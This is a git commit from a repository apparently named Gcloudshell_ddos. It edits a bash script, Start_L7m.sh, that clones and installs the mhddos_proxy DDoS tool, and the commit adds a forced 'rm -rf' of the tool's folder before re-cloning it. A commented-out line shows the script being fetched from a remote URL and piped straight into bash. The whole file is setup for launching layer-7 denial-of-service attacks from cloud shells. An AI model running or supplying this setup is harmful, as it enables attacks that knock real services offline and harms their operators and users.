7af720970130181fe8d4668a8c4f173cde96da54
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-20 10:42:45 +0300

    Update Start_L7m.sh

--- Start_L7m.sh
+++ Start_L7m.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 #curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
+rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
